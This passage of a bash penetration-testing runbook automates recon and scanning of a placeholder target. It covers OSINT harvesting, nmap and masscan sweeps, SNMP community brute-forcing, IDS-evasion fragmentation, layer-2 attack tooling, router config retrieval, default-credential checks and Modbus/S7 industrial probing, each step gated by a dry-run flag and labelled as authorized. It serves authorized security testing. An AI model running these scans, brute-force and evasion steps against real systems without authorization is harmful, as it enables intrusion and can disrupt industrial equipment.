# 65. Mail authentication posture (SPF, DKIM, DMARC)  (authorized-active)
if [ "$DRY_RUN" = "1" ]; then
  skip '65. Mail authentication posture (SPF, DKIM, DMARC)'
else
  { for r in TXT MX; do dig +short $r yourtarget.com; done; dig +short TXT _dmarc.yourtarget.com; dig +short TXT default._domainkey.yourtarget.com | tee ~/BugX/thuringerbank/01_recon/mail_posture.txt ; } 2>&1 | tee -a "$LOG"
fi

# 66. Authoritative resolution path  (authorized-active)
if [ "$DRY_RUN" = "1" ]; then
  skip '66. Authoritative resolution path'
else
  { dnstracer -s . -o -r yourtarget.com | tee ~/BugX/thuringerbank/01_recon/dnstracer.txt ; } 2>&1 | tee -a "$LOG"
fi

# 67. Zone hygiene check  (authorized-active)
if [ "$DRY_RUN" = "1" ]; then
  skip '67. Zone hygiene check'
else
  { dnswalk -r -d yourtarget.com. 2>&1 | tee ~/BugX/thuringerbank/01_recon/dnswalk.txt ; } 2>&1 | tee -a "$LOG"
fi

# 68. Certificate transparency harvest in the background  (authorized-active)
if [ "$DRY_RUN" = "1" ]; then
  skip '68. Certificate transparency harvest in the background'
else
  { curl -sS --max-time 15 "https://crt.sh/?q=%yourtarget.com&output=json" | jq -r '.[].name_value' | sed 's/\*\.//g' | tr 'A-Z' 'a-z' | sort -u | tee ~/BugX/thuringerbank/01_recon/crtsh_hosts.txt | wc -l ; } 2>&1 | tee -a "$LOG"
fi

# 69. Internet-exposure search for the estate  (authorized-active)
# PREREQUISITE: export SHODAN_API_KEY, or run without Shodan — this entry is optional
if [ "$DRY_RUN" = "1" ]; then
  skip '69. Internet-exposure search for the estate'
else
  { shodan search --fields ip_str,port,org,hostnames,product "ssl.cert.subject.cn:yourtarget.com" | head -n 80 | tee ~/BugX/thuringerbank/01_recon/shodan.txt ; } 2>&1 | tee -a "$LOG"
fi

# 70. Automated OSINT correlation  (authorized-active)
if [ "$DRY_RUN" = "1" ]; then
  skip '70. Automated OSINT correlation'
else
  { spiderfoot -s yourtarget.com -t DOMAIN_NAME,IP_ADDRESS -m all -q -o csv -O ~/BugX/thuringerbank/01_recon/spiderfoot ; } 2>&1 | tee -a "$LOG"
fi

# 71. Username, domain and phone footprinting  (authorized-active)
if [ "$DRY_RUN" = "1" ]; then
  skip '71. Username, domain and phone footprinting'
else
  { domainfy.py -d login 2>/dev/null | tee ~/BugX/thuringerbank/01_recon/domainfy.txt ; } 2>&1 | tee -a "$LOG"
fi

# 72. Public document metadata harvesting  (authorized-active)
if [ "$DRY_RUN" = "1" ]; then
  skip '72. Public document metadata harvesting'
else
  { metagoofil -d yourtarget.com -t pdf,doc,docx,xls,xlsx,ppt -l 200 -n 100 -o ~/BugX/thuringerbank/01_recon/docs 2>&1 | tail -n 20 ; } 2>&1 | tee -a "$LOG"
fi

# 73. Public file discovery by type  (authorized-active)
if [ "$DRY_RUN" = "1" ]; then
  skip '73. Public file discovery by type'
else
  { goofile -d yourtarget.com -f pdf | tee ~/BugX/thuringerbank/01_recon/goofile_pdf.txt ; } 2>&1 | tee -a "$LOG"
fi

# 74. Subdomain takeover fingerprinting  (authorized-active)
if [ "$DRY_RUN" = "1" ]; then
  skip '74. Subdomain takeover fingerprinting'
else
  { subjack -w ~/BugX/thuringerbank/01_recon/hosts.txt -t 100 -timeout 15 -ssl -c /usr/share/subjack/fingerprints.json -o ~/BugX/thuringerbank/01_recon/subjack.txt ; } 2>&1 | tee -a "$LOG"
fi

# 75. Reputation and exposure lookups  (authorized-active)
if [ "$DRY_RUN" = "1" ]; then
  skip '75. Reputation and exposure lookups'
else
  { automater -o ~/BugX/thuringerbank/01_recon/automater -t yourtarget.com ; } 2>&1 | tee -a "$LOG"
fi

# 76. Reverse host discovery from search indexes  (authorized-active)
if [ "$DRY_RUN" = "1" ]; then
  skip '76. Reverse host discovery from search indexes'
else
  { bing-ip2hosts -p yourtarget.com 2>/dev/null | tee ~/BugX/thuringerbank/01_recon/bing_ip2hosts.txt ; } 2>&1 | tee -a "$LOG"
fi

# 77. LinkedIn presence and role discovery  (requires consent)
if [ "$DRY_RUN" = "1" ]; then
  skip '77. LinkedIn presence and role discovery'
else
  { inspy --empspy login 2>/dev/null | tee ~/BugX/thuringerbank/01_recon/employees.txt ; } 2>&1 | tee -a "$LOG"
fi

# 78. Modular OSINT workspace  (authorized-active)
if [ "$DRY_RUN" = "1" ]; then
  skip '78. Modular OSINT workspace'
else
  { recon-ng -w ~/BugX/thuringerbank/01_recon/recon-ng -C 'marketplace install all' -C 'workspaces select default' ; } 2>&1 | tee -a "$LOG"
fi

# ---------------------------------------------------------------- Nmap service & port scanning
note '[Nmap service & port scanning] a full TCP range at 10 pkts/s plus script scans'

# 79. Host discovery across the authorized range  (passive)
if [ "$DRY_RUN" = "1" ]; then
  skip '79. Host discovery across the authorized range'
else
  { sudo nmap -sn -PE -PS22,80,443 -PA80,443 --max-rate 10 -oA ~/BugX/thuringerbank/02_scanning/nmap_discovery $BS_CIDR ; } 2>&1 | tee -a "$LOG"
fi

# 80. Top-1000 TCP ports with service and default scripts  (authorized-active)
if [ "$DRY_RUN" = "1" ]; then
  skip '80. Top-1000 TCP ports with service and default scripts'
else
  { sudo nmap -sS -sV -sC -Pn --top-ports 1000 --max-rate 10 --max-retries 2 -oA ~/BugX/thuringerbank/02_scanning/nmap_top1000 yourtarget.com ; } 2>&1 | tee -a "$LOG"
fi

# 81. Full 65,535-port TCP sweep  (authorized-active · loud)
if [ "$DRY_RUN" = "1" ]; then
  skip '81. Full 65,535-port TCP sweep'
else
  { sudo nmap -sS -p- -Pn --max-rate 10 --max-retries 2 -oA ~/BugX/thuringerbank/02_scanning/nmap_alltcp yourtarget.com ; } 2>&1 | tee -a "$LOG"
fi

# 82. UDP sweep of the common services  (authorized-active)
if [ "$DRY_RUN" = "1" ]; then
  skip '82. UDP sweep of the common services'
else
  { sudo nmap -sU --top-ports 100 --max-rate 50 -oA ~/BugX/thuringerbank/02_scanning/nmap_udp yourtarget.com ; } 2>&1 | tee -a "$LOG"
fi

# 83. Deep version detection on the ports you confirmed  (authorized-active)
if [ "$DRY_RUN" = "1" ]; then
  skip '83. Deep version detection on the ports you confirmed'
else
  { sudo nmap -sV --version-intensity 9 -p $BS_PORTS --max-rate 10 -oA ~/BugX/thuringerbank/02_scanning/nmap_deep yourtarget.com ; } 2>&1 | tee -a "$LOG"
fi

# 84. OS detection and path tracing  (authorized-active)
if [ "$DRY_RUN" = "1" ]; then
  skip '84. OS detection and path tracing'
else
  { sudo nmap -O --osscan-guess --traceroute -p $BS_PORTS --max-rate 10 -oA ~/BugX/thuringerbank/02_scanning/nmap_os yourtarget.com ; } 2>&1 | tee -a "$LOG"
fi

# 85. Very fast port sweep (coordinate the window first)  (authorized-active · loud)
if [ "$DRY_RUN" = "1" ]; then
  skip '85. Very fast port sweep (coordinate the window first)'
else
  { sudo masscan -p1-65535 --rate 1000 -oL ~/BugX/thuringerbank/02_scanning/masscan.lst $BS_CIDR ; } 2>&1 | tee -a "$LOG"
fi

# 86. Fast liveness sweep of the range  (authorized-active)
if [ "$DRY_RUN" = "1" ]; then
  skip '86. Fast liveness sweep of the range'
else
  { fping -asg $BS_CIDR | tee ~/BugX/thuringerbank/01_recon/fping_live.txt | tail -n 20 ; } 2>&1 | tee -a "$LOG"
fi

# 87. Layer-2 discovery on the local segment  (authorized-active)
if [ "$DRY_RUN" = "1" ]; then
  skip '87. Layer-2 discovery on the local segment'
else
  { sudo arp-scan --interface=eth0 --localnet | tee ~/BugX/thuringerbank/01_recon/arp_scan.txt ; } 2>&1 | tee -a "$LOG"
fi

# 88. Distributed nmap across client nodes  (authorized-active)
if [ "$DRY_RUN" = "1" ]; then
  skip '88. Distributed nmap across client nodes'
else
  { dnmap_server -f ~/BugX/thuringerbank/02_scanning/dnmap_commands.txt ; } 2>&1 | tee -a "$LOG"
fi

# ---------------------------------------------------------------- NSE script library & protocol checks
note '[NSE script library & protocol checks] the script categories are the slow part — budget 10 minutes for vuln'

# 89. Discovery and safe script categories  (authorized-active)
if [ "$DRY_RUN" = "1" ]; then
  skip '89. Discovery and safe script categories'
else
  { sudo nmap -sV -Pn -p $BS_PORTS --script discovery,safe --script-timeout 5m -oA ~/BugX/thuringerbank/02_scanning/nmap_nse_safe yourtarget.com ; } 2>&1 | tee -a "$LOG"
fi

# 90. Vulnerability script category  (authorized-active · loud)
if [ "$DRY_RUN" = "1" ]; then
  skip '90. Vulnerability script category'
else
  { sudo nmap -Pn -sV -p $BS_PORTS --script vuln --script-timeout 10m --max-retries 2 -oA ~/BugX/thuringerbank/02_scanning/nmap_nse_vuln yourtarget.com ; } 2>&1 | tee -a "$LOG"
fi

# 91. HTTP, WebDAV and method scripts  (authorized-active)
if [ "$DRY_RUN" = "1" ]; then
  skip '91. HTTP, WebDAV and method scripts'
else
  { sudo nmap -Pn -p $BS_PORTS --script http-enum,http-headers,http-methods,http-cors,http-put,http-title,http-webdav-scan,http-shellshock -oA ~/BugX/thuringerbank/02_scanning/nmap_nse_http yourtarget.com ; } 2>&1 | tee -a "$LOG"
fi

# 92. SMB and NetBIOS scripts  (authorized-active)
if [ "$DRY_RUN" = "1" ]; then
  skip '92. SMB and NetBIOS scripts'
else
  { sudo nmap -Pn -p 139,445 --script smb-os-discovery,smb-enum-shares,smb-enum-users,smb-security-mode,smb-vuln-ms17-010,smb2-security-mode -oA ~/BugX/thuringerbank/02_scanning/nmap_nse_smb yourtarget.com ; } 2>&1 | tee -a "$LOG"
fi

# 93. TLS and SSH scripts  (authorized-active)
if [ "$DRY_RUN" = "1" ]; then
  skip '93. TLS and SSH scripts'
else
  { sudo nmap -Pn -p $BS_PORTS --script ssl-enum-ciphers,ssl-heartbleed,ssl-dh-params,ssh-auth-methods,ssh-hostkey,ssh2-enum-algos -oA ~/BugX/thuringerbank/02_scanning/nmap_nse_tls yourtarget.com ; } 2>&1 | tee -a "$LOG"
fi

# 94. DNS, mail, FTP and database scripts  (authorized-active)
if [ "$DRY_RUN" = "1" ]; then
  skip '94. DNS, mail, FTP and database scripts'
else
  { sudo nmap -Pn -p $BS_PORTS --script dns-recursion,dns-cache-snoop,smtp-open-relay,smtp-enum-users,ftp-anon,mysql-enum,mysql-info,ms-sql-info,oracle-tns-version -oA ~/BugX/thuringerbank/02_scanning/nmap_nse_misc yourtarget.com ; } 2>&1 | tee -a "$LOG"
fi

# 95. Remote-access service scripts  (authorized-active)
if [ "$DRY_RUN" = "1" ]; then
  skip '95. Remote-access service scripts'
else
  { sudo nmap -Pn -p 3389,5900,623,161 --script rdp-enum-encryption,rdp-ntlm-info,vnc-info,ipmi-version,ipmi-brute,snmp-info -oA ~/BugX/thuringerbank/02_scanning/nmap_nse_remote yourtarget.com ; } 2>&1 | tee -a "$LOG"
fi

# 96. Firewall and ACL behaviour mapping  (authorized-active)
if [ "$DRY_RUN" = "1" ]; then
  skip '96. Firewall and ACL behaviour mapping'
else
  { sudo nmap -sA -Pn --top-ports 200 --max-rate 10 -oA ~/BugX/thuringerbank/02_scanning/nmap_ack yourtarget.com ; } 2>&1 | tee -a "$LOG"
fi

# 97. Packet-level port and firewall behaviour  (authorized-active)
if [ "$DRY_RUN" = "1" ]; then
  skip '97. Packet-level port and firewall behaviour'
else
  { sudo hping3 -S -p $BS_PORT -c 5 -V yourtarget.com | tail -n 10 ; } 2>&1 | tee -a "$LOG"
fi

# 98. Gateway ACL mapping  (authorized-active)
if [ "$DRY_RUN" = "1" ]; then
  skip '98. Gateway ACL mapping'
else
  { sudo firewalk -S $BS_PORT -i eth0 -n -P TCP $BS_GW | tail -n 20 ; } 2>&1 | tee -a "$LOG"
fi

# 99. Fragmentation handling on an authorized segment  (opt-in heavy)
if [ "$DRY_RUN" = "1" ]; then
  skip '99. Fragmentation handling on an authorized segment'
else
  { sudo fragroute -f /etc/fragroute.conf $BS_GW -T1 -p 0.3 -B ; } 2>&1 | tee -a "$LOG"
fi

# 100. IDS/IPS evasion behaviour check  (opt-in heavy)
if [ "$DRY_RUN" = "1" ]; then
  skip '100. IDS/IPS evasion behaviour check'
else
  { sudo fragrouter -T1 -p 0.3 -B ; } 2>&1 | tee -a "$LOG"
fi

# ---------------------------------------------------------------- SNMP, NetBIOS, layer-2 & capture
note '[SNMP, NetBIOS, layer-2 & capture] light — a few packets or one capture each'

# 101. Banner grab a single port  (authorized-active)
if [ "$DRY_RUN" = "1" ]; then
  skip '101. Banner grab a single port'
else
  { nc -nv -w 15 yourtarget.com $BS_PORT ; } 2>&1 | tee -a "$LOG"
fi

# 102. Passive OS fingerprinting  (passive)
if [ "$DRY_RUN" = "1" ]; then
  skip '102. Passive OS fingerprinting'
else
  { sudo p0f -i eth0 -o ~/BugX/thuringerbank/02_scanning/p0f.log | tail -n 5 ; } 2>&1 | tee -a "$LOG"
fi

# 103. NetBIOS name survey  (authorized-active)
if [ "$DRY_RUN" = "1" ]; then
  skip '103. NetBIOS name survey'
else
  { nbtscan $BS_CIDR | tee ~/BugX/thuringerbank/02_scanning/nbtscan.txt | head -n 40 ; } 2>&1 | tee -a "$LOG"
fi

# 104. SNMP enumeration  (authorized-active)
if [ "$DRY_RUN" = "1" ]; then
  skip '104. SNMP enumeration'
else
  { snmp-check -c public -v 2c yourtarget.com | tee ~/BugX/thuringerbank/02_scanning/snmpcheck.txt | head -n 40 ; } 2>&1 | tee -a "$LOG"
fi

# 105. SNMP community string testing  (opt-in heavy)
if [ "$DRY_RUN" = "1" ]; then
  skip '105. SNMP community string testing'
else
  { onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt yourtarget.com ; } 2>&1 | tee -a "$LOG"
fi

# 106. Fast SNMP OID sweep  (authorized-active)
if [ "$DRY_RUN" = "1" ]; then
  skip '106. Fast SNMP OID sweep'
else
  { braa public@yourtarget.com:.1.3.6.1.2.1.1.* | tee ~/BugX/thuringerbank/02_scanning/braa.txt ; } 2>&1 | tee -a "$LOG"
fi

# 107. Layer-2 protocol attack testing  (opt-in heavy)
if [ "$DRY_RUN" = "1" ]; then
  skip '107. Layer-2 protocol attack testing'
else
  { sudo yersinia -G ; } 2>&1 | tee -a "$LOG"
fi

# 108. IPv6 neighbour discovery survey  (opt-in heavy)
if [ "$DRY_RUN" = "1" ]; then
  skip '108. IPv6 neighbour discovery survey'
else
  { sudo atk6-alive6 eth0 | tee ~/BugX/thuringerbank/02_scanning/alive6.txt ; } 2>&1 | tee -a "$LOG"
fi

# 109. Capture the traffic for the service under test  (authorized-active)
if [ "$DRY_RUN" = "1" ]; then
  skip '109. Capture the traffic for the service under test'
else
  { sudo tcpdump -i eth0 -nn -s0 -w ~/BugX/thuringerbank/04_evidence/capture.pcap host yourtarget.com and port $BS_PORT ; } 2>&1 | tee -a "$LOG"
fi

# 110. Dissect the capture  (authorized-active)
if [ "$DRY_RUN" = "1" ]; then
  skip '110. Dissect the capture'
else
  { tshark -r ~/BugX/thuringerbank/04_evidence/capture.pcap -q -z io,phs | head -n 30 ; } 2>&1 | tee -a "$LOG"
fi

# ---------------------------------------------------------------- Network devices, perimeter & OT/ICS
note '[Network devices, perimeter & OT/ICS] light per device — configuration review is where the findings are'

# 111. Cisco device discovery and fingerprinting  (authorized-active)
if [ "$DRY_RUN" = "1" ]; then
  skip '111. Cisco device discovery and fingerprinting'
else
  { cisco-torch -A -b "$BS_CIDR" 2>&1 | tee ~/BugX/thuringerbank/02_scanning/cisco_torch.txt | head -n 40 ; } 2>&1 | tee -a "$LOG"
fi

# 112. Cisco configuration baseline check  (authorized-active)
if [ "$DRY_RUN" = "1" ]; then
  skip '112. Cisco configuration baseline check'
else
  { CAT -h "$BS_CIDR" -l /usr/share/cisco-auditing-tool/hosts.txt -i /usr/share/cisco-auditing-tool/IOS.txt 2>&1 | tail -n 40 ; } 2>&1 | tee -a "$LOG"
fi

# 113. Cisco version-specific vulnerability checks  (authorized-active)
if [ "$DRY_RUN" = "1" ]; then
  skip '113. Cisco version-specific vulnerability checks'
else
  { cge.pl "$BS_GW" 2>&1 | head -n 30 ; } 2>&1 | tee -a "$LOG"
fi

# 114. Cisco discovery over CDP/LLDP  (passive)
if [ "$DRY_RUN" = "1" ]; then
  skip '114. Cisco discovery over CDP/LLDP'
else
  { cisco-ocs -i eth0 2>&1 | tee ~/BugX/thuringerbank/01_recon/cisco_ocs.txt | head -n 30 ; } 2>&1 | tee -a "$LOG"
fi

# 115. Router configuration retrieval test  (opt-in heavy)
if [ "$DRY_RUN" = "1" ]; then
  skip '115. Router configuration retrieval test'
else
  { copy-router-config.pl "$BS_GW" "$BS_GW" private 2>&1 | tail -n 20 ; } 2>&1 | tee -a "$LOG"
fi

# 116. Full SNMP walk of a device  (authorized-active)
if [ "$DRY_RUN" = "1" ]; then
  skip '116. Full SNMP walk of a device'
else
  { snmpwalk -v2c -c public yourtarget.com | tee ~/BugX/thuringerbank/02_scanning/snmpwalk.txt | head -n 60 ; } 2>&1 | tee -a "$LOG"
fi

# 117. TFTP configuration transfer test  (opt-in heavy)
if [ "$DRY_RUN" = "1" ]; then
  skip '117. TFTP configuration transfer test'
else
  { tftp yourtarget.com -c get running-config ~/BugX/thuringerbank/04_evidence/running-config.txt 2>&1 | tail -n 5 ; } 2>&1 | tee -a "$LOG"
fi

# 118. Network device configuration review  (authorized-active)
if [ "$DRY_RUN" = "1" ]; then
  skip '118. Network device configuration review'
else
  { nipper --input=~/BugX/thuringerbank/04_evidence/running-config.txt --output=~/BugX/thuringerbank/05_reports/nipper.html --format=html --report=all 2>&1 | tail -n 10 ; } 2>&1 | tee -a "$LOG"
fi

# 119. Firewall and ACL behaviour mapping  (authorized-active)
if [ "$DRY_RUN" = "1" ]; then
  skip '119. Firewall and ACL behaviour mapping'
else
  { sudo nmap -sA -Pn --top-ports 200 --max-rate 10 -oA ~/BugX/thuringerbank/02_scanning/nmap_ack yourtarget.com ; } 2>&1 | tee -a "$LOG"
fi

# 120. Device management-plane SSH review  (authorized-active)
if [ "$DRY_RUN" = "1" ]; then
  skip '120. Device management-plane SSH review'
else
  { ssh-audit yourtarget.com 2>/dev/null | tee ~/BugX/thuringerbank/02_scanning/ssh_audit_device.txt | head -n 40 ; } 2>&1 | tee -a "$LOG"
fi

# 121. Default-credential check on management interfaces  (opt-in heavy)
if [ "$DRY_RUN" = "1" ]; then
  skip '121. Default-credential check on management interfaces'
else
  { sudo nmap -Pn -p 22,23,80,443,8080 --script="http-default-accounts,ftp-anon" -oA ~/BugX/thuringerbank/03_exploits/nmap_default_creds yourtarget.com ; } 2>&1 | tee -a "$LOG"
fi

# 122. PLC discovery on the OT segment  (opt-in heavy)
if [ "$DRY_RUN" = "1" ]; then
  skip '122. PLC discovery on the OT segment'
else
  { python3 plcscan.py "$BS_CIDR" 2>&1 | tee ~/BugX/thuringerbank/02_scanning/plcscan.txt | head -n 40 ; } 2>&1 | tee -a "$LOG"
fi

# 123. ICS protocol identification  (authorized-active)
if [ "$DRY_RUN" = "1" ]; then
  skip '123. ICS protocol identification'
else
  { sudo nmap -Pn -p 502,102,44818,47808,20000,2404 --script="modbus-discover,s7-info,enip-info,bacnet-info,dnp3-info,iec-identify" "$BS_CIDR" -oA ~/BugX/thuringerbank/02_scanning/nmap_ics ; } 2>&1 | tee -a "$LOG"
fi

# 124. Read Modbus holding registers  (opt-in heavy)
if [ "$DRY_RUN" = "1" ]; then
  skip '124. Read Modbus holding registers'
else
  { mbtget -r1 -a 0 -n 20 -u 1 yourtarget.com 2>&1 | tee ~/BugX/thuringerbank/04_evidence/modbus_registers.txt | head -n 40 ; } 2>&1 | tee -a "$LOG"
fi

# 125. Modbus interrogation with a readable output  (opt-in heavy)
if [ "$DRY_RUN" = "1" ]; then
  skip '125. Modbus interrogation with a readable output'
else
  { modbus read yourtarget.com 40001 20 2>&1 | tee ~/BugX/thuringerbank/04_evidence/modbus_cli.txt ; } 2>&1 | tee -a "$LOG"
fi

# 126. Siemens S7 device discovery  (opt-in heavy)
if [ "$DRY_RUN" = "1" ]; then
  skip '126. Siemens S7 device discovery'
else
  { python3 s7scan.py "$BS_CIDR" 2>&1 | tee ~/BugX/thuringerbank/02_scanning/s7scan.txt | head -n 30 ; } 2>&1 | tee -a "$LOG"
fi

# 127. Industrial exploitation framework checks  (opt-in heavy)
if [ "$DRY_RUN" = "1" ]; then
  skip '127. Industrial exploitation framework checks'
else
  { python3 isf.py -h ; } 2>&1 | tee -a "$LOG"
fi

# 128. Capture and dissect OT traffic  (passive)
if [ "$DRY_RUN" = "1" ]; then
  skip '128. Capture and dissect OT traffic'
else
  { sudo tcpdump -i eth0 -nn -s0 -w ~/BugX/thuringerbank/04_evidence/ot_capture.pcap 'port 502 or port 102 or port 44818' ; } 2>&1 | tee -a "$LOG"
fi

# 129. External exposure of OT protocols  (passive)
if [ "$DRY_RUN" = "1" ]; then
  skip '129. External exposure of OT protocols'
else
  { shodan search --fields ip_str,port,org,product 'port:502 OR port:102 OR port:44818' | head -n 40 | tee ~/BugX/thuringerbank/01_recon/shodan_ot.txt ; } 2>&1 | tee -a "$LOG"
fi

# 130. BACnet device discovery  (opt-in heavy)
if [ "$DRY_RUN" = "1" ]; then
  skip '130. BACnet device discovery'
else
  { python3 bacnet-scan.py "$BS_CIDR" 2>&1 | tee ~/BugX/thuringerbank/02_scanning/bacnet.txt | head -n 30 ; } 2>&1 | tee -a "$LOG"
fi

# ---------------------------------------------------------------- TLS, SSH & cryptographic configuration
note '[TLS, SSH & cryptographic configuration] a few hundred handshakes per host at 10 req/s — quick, but do it per endpoint'

# 131. Full TLS assessment of the primary endpoint  (authorized-active)
if [ "$DRY_RUN" = "1" ]; then
  skip '131. Full TLS assessment of the primary endpoint'
else
  { testssl.sh --quiet --color 0 --severity HIGH --jsonfile ~/BugX/thuringerbank/02_scanning/testssl.json --htmlfile ~/BugX/thuringerbank/05_reports/testssl.html https://yourtarget.com ; } 2>&1 | tee -a "$LOG"
fi

# 132. Deep TLS scan with JSON output  (authorized-active)
if [ "$DRY_RUN" = "1" ]; then
  skip '132. Deep TLS scan with JSON output'
else
  { sslyze --regular --json_out=~/BugX/thuringerbank/02_scanning/sslyze.json yourtarget.com:443 ; } 2>&1 | tee -a "$LOG"
fi

# 133. Cipher and protocol summary  (authorized-active)
if [ "$DRY_RUN" = "1" ]; then
  skip '133. Cipher and protocol summary'
else
  { sslscan --no-failed --show-certificate yourtarget.com:443 | tee ~/BugX/thuringerbank/02_scanning/sslscan.txt ; } 2>&1 | tee -a "$LOG"
fi

# 134. Probe each protocol version explicitly  (authorized-active)
if [ "$DRY_RUN" = "1" ]; then
  skip '134. Probe each protocol version explicitly'
else
  { for p in tls1 tls1_1 tls1_2 tls1_3; do printf '%s ' "$p"; echo Q | openssl s_client -connect yourtarget.com:443 -$p -servername yourtarget.com 2>/dev/null | grep -m1 'Protocol\|handshake failure\|alert'; done | tee ~/BugX/thuringerbank/02_scanning/openssl_versions.txt ; } 2>&1 | tee -a "$LOG"
fi

# 135. Inspect the certificate chain and validity  (authorized-active)
if [ "$DRY_RUN" = "1" ]; then
  skip '135. Inspect the certificate chain and validity'
else
  { echo | openssl s_client -connect yourtarget.com:443 -servername yourtarget.com -showcerts 2>/dev/null | openssl x509 -noout -subject -issuer -dates -ext subjectAltName | tee ~/BugX/thuringerbank/02_scanning/cert_info.txt ; } 2>&1 | tee -a "$LOG"
fi

# 136. Heartbleed and DH parameter checks  (authorized-active)
if [ "$DRY_RUN" = "1" ]; then
  skip '136. Heartbleed and DH parameter checks'
else
  { sudo nmap -Pn -p 443 --script ssl-heartbleed,ssl-dh-params,ssl-enum-ciphers -oA ~/BugX/thuringerbank/02_scanning/nmap_ssl_deep yourtarget.com ; } 2>&1 | tee -a "$LOG"
fi

# 137. Third-party TLS grade for a public endpoint  (authorized-active)
# PREREQUISITE: third-party API use must be permitted by the program
if [ "$DRY_RUN" = "1" ]; then
  skip '137. Third-party TLS grade for a public endpoint'
else
  { curl -sS "https://api.ssllabs.com/api/v3/analyze?host=yourtarget.com&publish=off&all=done" | jq '{grade:.endpoints[0].grade, hasWarnings:.endpoints[0].hasWarnings, details:.endpoints[0].details.serverSignatureAlgorithms}' ; } 2>&1 | tee -a "$LOG"
fi

# 138. SSH algorithm review  (authorized-active)
if [ "$DRY_RUN" = "1" ]; then
  skip '138. SSH algorithm review'
else
  { ssh-audit -b -j yourtarget.com:22 > ~/BugX/thuringerbank/02_scanning/ssh_audit.json; jq '.kex,.enc,.mac' ~/BugX/thuringerbank/02_scanning/ssh_audit.json | head -n 30 ; } 2>&1 | tee -a "$LOG"
fi

# 139. JWT signature and algorithm handling  (authorized-active)
if [ "$DRY_RUN" = "1" ]; then
  skip '139. JWT signature and algorithm handling'
else
  { echo "$BS_TOKEN" | cut -d. -f1 | base64 -d 2>/dev/null | jq '{alg:.alg,kid:.kid}'; echo "$BS_TOKEN" | cut -d. -f2 | base64 -d 2>/dev/null | jq . ; } 2>&1 | tee -a "$LOG"
fi

# 140. Encryption across every enumerated endpoint  (authorized-active)
if [ "$DRY_RUN" = "1" ]; then
  skip '140. Encryption across every enumerated endpoint'
else
  { while read -r h; do printf '%s ' "$h"; sslscan --no-failed "$h:443" 2>/dev/null | grep -c 'Accepted'; done < ~/BugX/thuringerbank/01_recon/hosts.txt | tee ~/BugX/thuringerbank/02_scanning/tls_all_hosts.txt ; } 2>&1 | tee -a "$LOG"
fi

# ---------------------------------------------------------------- Web crawling & content discovery
note '[Web crawling & content discovery] crawl depth 3 at 10 req/s, then one request per wordlist entry'

# 141. Crawl the application, including JavaScript routes  (authorized-active)
if [ "$DRY_RUN" = "1" ]; then
  skip '141. Crawl the application, including JavaScript routes'
else
  { katana -u https://yourtarget.com -d 3 -jc -kf all -c 5 -rate-limit 10 -timeout 15 -proxy '127.0.0.1:8080' -silent -o ~/BugX/thuringerbank/02_scanning/katana_urls.txt ; } 2>&1 | tee -a "$LOG"
fi

# 142. Directory and file discovery with your wordlist  (authorized-active)
if [ "$DRY_RUN" = "1" ]; then
  skip '142. Directory and file discovery with your wordlist'
else
  { gobuster dir -u https://yourtarget.com -w /usr/share/wordlists/dirb/common.txt -t 5 --timeout 15s -p 127.0.0.1:8080 -x php,asp,aspx,jsp,json,html,bak,old,zip,txt -o ~/BugX/thuringerbank/02_scanning/gobuster.txt -q ; } 2>&1 | tee -a "$LOG"
fi

# 143. Recursive discovery to two levels  (authorized-active)
if [ "$DRY_RUN" = "1" ]; then
  skip '143. Recursive discovery to two levels'
else
  { feroxbuster -u https://yourtarget.com -w /usr/share/wordlists/dirb/common.txt --threads 5 --rate-limit 10 --timeout 15 --depth 2 --json -o ~/BugX/thuringerbank/02_scanning/ferox.json -q ; } 2>&1 | tee -a "$LOG"
fi

# 144. Fast parameter and path fuzzing  (authorized-active)
if [ "$DRY_RUN" = "1" ]; then
  skip '144. Fast parameter and path fuzzing'
else
  { ffuf -w /usr/share/wordlists/dirb/common.txt -u https://yourtarget.com/FUZZ -t 5 -rate 10 -timeout 15 -ac -mc 200,204,301,302,307,401,403,405 -of json -o ~/BugX/thuringerbank/02_scanning/ffuf.json | tail -n 15 ; } 2>&1 | tee -a "$LOG"
fi

# 145. Fuzz a named parameter with payloads  (authorized-active)
# PREREQUISITE: replace BS_PARAM with a real parameter from the parameter inventory
if [ "$DRY_RUN" = "1" ]; then
  skip '145. Fuzz a named parameter with payloads'
else
  { wfuzz -c -z file,/usr/share/wordlists/dirb/common.txt --hc 404 -t 5 -s 0.10 https://yourtarget.com/?BS_PARAM=FUZZ 2>&1 | tail -n 25 ; } 2>&1 | tee -a "$LOG"
fi

# 146. Dictionary-based content discovery  (authorized-active)
if [ "$DRY_RUN" = "1" ]; then
  skip '146. Dictionary-based content discovery'
else
  { dirb https://yourtarget.com /usr/share/wordlists/dirb/common.txt -S -r -o ~/BugX/thuringerbank/02_scanning/dirb.txt -X .php,.bak,.txt.json ; } 2>&1 | tee -a "$LOG"
fi

# 147. GUI content discovery for a long run  (authorized-active)
if [ "$DRY_RUN" = "1" ]; then
  skip '147. GUI content discovery for a long run'
else
  { dirbuster -H -u https://yourtarget.com -l /usr/share/wordlists/dirb/common.txt -r ~/BugX/thuringerbank/02_scanning/dirbuster-report -t 5 ; } 2>&1 | tee -a "$LOG"
fi

# 148. Automated crawl and scan  (authorized-active · loud)
if [ "$DRY_RUN" = "1" ]; then
  skip '148. Automated crawl and scan'
else
  { skipfish -o ~/BugX/thuringerbank/02_scanning/skipfish -W- -l 10 -m 5 -LV https://yourtarget.com ; } 2>&1 | tee -a "$LOG"
fi

# 149. Server and CGI misconfiguration scan  (authorized-active)
if [ "$DRY_RUN" = "1" ]; then
  skip '149. Server and CGI misconfiguration scan'
else
  { nikto -h https://yourtarget.com -Tuning 123456789 -Display V -maxtime 20m -o ~/BugX/thuringerbank/02_scanning/nikto.txt -Format txt ; } 2>&1 | tee -a "$LOG"
fi

# 150. Technology fingerprinting of the live target  (authorized-active)
if [ "$DRY_RUN" = "1" ]; then
  skip '150. Technology fingerprinting of the live target'
else
  { whatweb -a 3 --no-errors --log-json=~/BugX/thuringerbank/02_scanning/whatweb.json https://yourtarget.com | head -n 20 ; } 2>&1 | tee -a "$LOG"
fi

# 151. Identify the edge protection in front of the app  (authorized-active)
if [ "$DRY_RUN" = "1" ]; then
  skip '151. Identify the edge protection in front of the app'
else
  { wafw00f https://yourtarget.com -a -o ~/BugX/thuringerbank/02_scanning/waf.txt -f text ; } 2>&1 | tee -a "$LOG"
fi

# 152. Inspect the raw request and response cycle  (authorized-active)
if [ "$DRY_RUN" = "1" ]; then
  skip '152. Inspect the raw request and response cycle'
else
  { hurl --very-verbose https://yourtarget.com | head -n 40 ; } 2>&1 | tee -a "$LOG"
fi

